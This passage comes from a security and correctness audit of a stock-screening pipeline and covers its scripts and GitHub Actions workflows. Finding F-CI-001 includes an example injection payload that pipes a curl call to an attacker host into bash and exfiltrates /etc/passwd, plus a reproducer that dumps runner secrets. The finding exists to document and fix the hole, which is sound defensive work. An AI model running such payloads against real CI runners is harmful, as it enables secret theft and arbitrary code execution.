   - **Compound:** CG-001 (F-DP-004 + F-DP-005 + F-DP-009 + F-DP-010 — year-misalignment cascade)

3. **[HIGH]** `generate-modes-report.js:344-386` — FCF margin and revenue growth sentinels (-999) hide cards when UI sliders are moved
   - **Root cause:** `fcfMargin = -999` and `revGrowth = -999` are used when Rule-of-40 is not computable; the JS filter blocks values < -100, so any slider movement above the default hides all non-computable-R40 stocks

   - **Compound:** F-ME-006 + F-ME-007 (same root cause, two attributes)

4. **[HIGH]** `detect-changes.js:389` — File filter admits `_manifest-full.json` as a real stock snapshot
   - **Root cause:** Filter `f !== '_manifest.json'` uses exact-match instead of `!f.startsWith('_')`; the fix was applied to five other scripts but missed detect-changes.js

   - **Fix:** Change line 389 to: `filter(f => f.endsWith('.json') && !f.startsWith('_'))` — identical to the fix in snapshot-methods-history.js, snapshot-picks.js, and generate-modes-report.js
   - **Compound:** CG-003 (F-SM-005 + F-PF-007 — same underscore-prefix filter omission in two places)

5. **[HIGH]** `methods/deceleration-guard.js:42-46` — Missing TTM growth silently bypasses the deceleration guard (always pass)
   - **Root cause:** Both `hardFail` and `softFail` conditions are gated on `ttmGrowth != null`; when absent, both are false and `pass=true` is returned without an incomputable flag
   - **Impact:** Stocks with genuinely decelerating revenue but missing TTM growth metric appear in hypergrowth mode rankings without the deceleration penalty; DATAGUARD is silently bypassed

   - **Compound:** CG-004 (F-ME-005 + F-DQ-013 — data gaps silently pass quality gates)

### CRITICAL

#### F-CI-001
- **Severity:** CRITICAL
- **Category:** ci-config
- **Title:** `${{ inputs.max }}` directly interpolated into shell — workflow_dispatch code injection
- **File:** `.github/workflows/monthly-sec-xbrl.yml:53-58`
- **Evidence tier:** T1
- **Description:** GitHub expression interpolation splices raw user input into the bash command before the shell executes. Any repo collaborator can supply `0; curl attacker.com/$(cat /etc/passwd) | bash` as the `max` input and execute arbitrary commands on the runner with full access to all bound secrets.
- **Mechanism:** `node pull-sec-xbrl.js --max ${{ inputs.max }}` — the expression is evaluated at YAML-template time and the composite string is passed verbatim to bash with no quoting or sanitisation.
- **Reproducer:** Trigger `workflow_dispatch` with `max = 0; env | base64`. Runner logs contain all environment variables including GITHUB_TOKEN.
- **Impact:** Full runner compromise: secrets exfiltration (GITHUB_TOKEN, DISCORD_WEBHOOK, FINNHUB_API_KEY), arbitrary code execution, ability to push malicious commits to main.
- **Fix:** `env: MAX_INPUT: ${{ inputs.max }}` + shell integer validation before use
- **Compound group:** CG-005

#### F-DP-001
- **Severity:** HIGH
- **Category:** race-condition
- **Title:** Worker pool shared `idx` counter: OOB access possible when last slot races
- **File:** `pull-yahoo.js:1963-1977`
- **Evidence tier:** T1
- **Description:** Two workers can both pass the `while (idx < stocks.length)` guard before either increments; one gets `myIdx = stocks.length` (OOB). #### F-CI-002

- **Category:** state-atomicity

- **File:** `.github/workflows/daily-pull.yml:572-603`
- **Evidence tier:** T2
- **Description:** `COMMIT_SHA` is captured before the first rebase. ## Compound Bug Groups

### Group CG-001: FTS Override Length-Guard → Year Misalignment Cascade
- **Findings:** F-DP-004, F-DP-005, F-DP-009, F-DP-010
- **Interaction:** F-DP-004 and F-DP-005 prevent `annualRev` and `annualNetIncome` from being overridden with FTS data when QS returns null-filled arrays of the same length. F-DP-009 then fires independently (annualBalance override uses usable-row count, which CAN succeed), leaving annualBalance sourced from FTS while annualRev remains from QS — the two arrays are now from different fiscal-year series. F-DP-010 applies the same length-comparison bug to quarterly revenue.
- **Combined impact:** Methods that cross-index annual arrays (ROIC, Altman Z-score, net-debt/EBITDA, Sloan accrual, Beneish M-score, ROIC-trend) silently compute ratios from misaligned fiscal years, producing plausible-looking but wrong values for a large fraction of the non-US universe; simultaneously, methods that need quarterly revenue (acceleration-detection, quarterly gross-margin trend) also stay null-filled. **Fix F-DP-004 first** — it unblocks both F-DP-005 (same fix pattern) and eliminates the precondition for F-DP-009's misalignment.

### Group CG-002: Sentinel -999 Hidden Cards in Report UI
- **Findings:** F-ME-006, F-ME-007
- **Interaction:** Both use the same pattern: a -999 sentinel for non-computable-R40 metrics in FCF margin and revenue growth data attributes. Both JS filters block values < -100. Moving either slider reveals the bug: valid Quality-Compounder and Buffett candidates disappear from all mode views simultaneously.
- **Combined impact:** Users applying any revenue growth OR FCF filter see a silently reduced universe; if both sliders are moved, all non-computable-R40 stocks vanish entirely from every mode view. This affects the majority of the non-hypergrowth mode candidates. A single fix (change sentinel to `'n/a'`, update both filters) resolves both.

### Group CG-003: Underscore-File Filter Omission in Two Places
- **Findings:** F-SM-005, F-PF-007
- **Interaction:** Both `detect-changes.js` (F-SM-005) and `sector-medians-compute.js` CLI (F-PF-007) use exact-match filters (`f !== '_manifest.json'`) instead of the canonical `!f.startsWith('_')` that five other scripts already use. `_manifest-full.json` passes both filters.
- **Combined impact:** In `detect-changes.js`, `_manifest-full` accumulates phantom ticker state unboundedly and may trigger false Discord alerts. In `sector-medians-compute.js`, it wastes a ~2 MB JSON.parse per run. Both are the same root cause (incomplete propagation of the `startsWith('_')` fix) and should be fixed in the same commit.

### Group CG-004: Data Gaps Silently Pass Quality Gates (deceleration-guard + annualOCF monitoring gap)
- **Findings:** F-ME-005, F-DQ-013
- **Interaction:** F-ME-005 (deceleration-guard bypassed when `ttmGrowth` is null) and F-DQ-013 (annualOCF not in TRACKED_FIELDS) are independent bugs but share a pattern: data gaps produce false-positive results with no signal that anything is missing. Meanwhile, if Yahoo drops `operatingCashFlow` from FTS, three OCF-dependent methods silently fail — undetected for up to 14 runs.
- **Combined impact:** The same class of silent data-gap bypass operates at both the method-level (deceleration-guard) and the monitoring-level (field-coverage drift detection). A universe-wide Yahoo schema change can simultaneously render a DATAGUARD non-functional and evade the coverage monitor; stocks with decelerating revenue may enter hypergrowth rankings unchecked.

### Group CG-005: SEC XBRL Injection + No Hard-Fail Gate
- **Findings:** F-CI-001, F-CI-006
- **Interaction:** F-CI-001 allows a malicious user to trigger the SEC XBRL pull with arbitrary shell commands, including `max=1`. F-CI-006 means that even a legitimate `max=1` run produces a near-empty manifest (n_ok=1) which is committed without a hard-fail gate.
- **Combined impact:** An attacker can use the injection to force a minimal pull that replaces the authoritative SEC manifest with a near-empty one, degrading XBRL-backed metrics (Altman Z-score, Piotroski F-score) for the entire universe until the next monthly run — effectively a data-corruption attack that passes all CI checks.

### Group CG-006: Archive NDJSON Non-Atomic Write + TOCTOU Race
- **Findings:** F-SM-002, F-SM-003

### Group CG-009: Backtest Entry Date Drift (staleness gate + DST threshold)
- **Findings:** F-BT-101, F-BT-104
- **Interaction:** F-BT-104 (DST-unaware UTC=21 threshold) causes 7 of 8 current vintages to be classified as pre-market, shifting their entry date to T+1. ### Group CG-010: 4× Synchronous Reads per Fast-Path Ticker
- **Findings:** F-PF-001, F-PF-002
- **Interaction:** F-PF-001 describes three synchronous probes of the same snapshot file; F-PF-002 describes a fourth read inside `_priceOnlyUpdate`. All four are on the same file for the same ticker in the same `processOne` call. Each blocks the event loop, serializing all concurrent worker slots.

### Group CG-011: Schema Validation Failures → False Delistings + Backtest Survivor Bias

- **Combined impact:** A Yahoo API schema change causes a batch of valid stocks to be falsely marked as delisted and excluded from subsequent scoring.
